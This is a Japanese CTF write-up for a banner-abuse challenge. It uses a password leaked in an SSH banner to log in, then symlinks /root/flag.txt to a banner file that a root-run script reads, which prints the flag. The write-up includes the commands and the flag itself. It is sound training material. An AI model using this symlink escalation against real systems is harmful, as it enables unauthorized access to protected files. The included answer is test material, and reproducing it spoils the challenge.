## category
General skills
## probrem
Can you abuse the banner? The server has been leaking some crucial information on xebec.cylabacademy.net 47880. Use the leaked information to get to the server.

To connect to the running application use nc xebec.cylabacademy.net 22061. From the above information abuse the machine and find the flag in the /root directory.
## 難しさ
普通
## 解法
一つ目のサーバーをにつないでみると
```
SSH-2.0-OpenSSH_9.6p1 My_Passw@rd_@1234
```
パスワード的なものが出現。
なので次にもう一台のほうでpasswordが求められたので入力する。
```
$ nc xebec.cylabacademy.net 46503
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
```
そしていくつかの質問に答えるとターミナルが出現。
```
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:
```
そして実際に動いているプログラムの権限を確認したいが、
lsだけでは詳しくわからないので実際に  psコマンドで実行状況を調べていきます。
```
root           8       7  0 03:53 ?        00:00:00 python3 /root/script.py
```
すると何やら怪しげなものが表れたので見てみます。
```
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
```
ですがflag.txtは権限がありません。なのでscript.pyの中身を見てみます。
```
 print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")
```
なので home/player/bannerに対してシンボリックリンクでflag.txtを付けると
中身が見れそうです。
```
rm banner
ln -s /root/flag.txt /home/player/banner
```
そしてもう一度サーバーを立ち上げるとフラグが出現。
## 使用コマンド
### シンボリックリンクの作成
```
ln -s 紐づけるファイルパス　ショートカット名
```
### bashで動いているものを確認
```
ps -ef
```
-eオプションですべて。
-fで詳細に。
## 答え
```
academy{b4nn3r_gr4bb1n9_su((3sfu11y_1aa2e989}
```
## ここから学んだこと
シンボリックリンクを用いてroot権限のファイルを実行できるようになること。
## つぎに考えること
ターミナル内での知識をもっと増やして論理的にたどりつけるようにする。
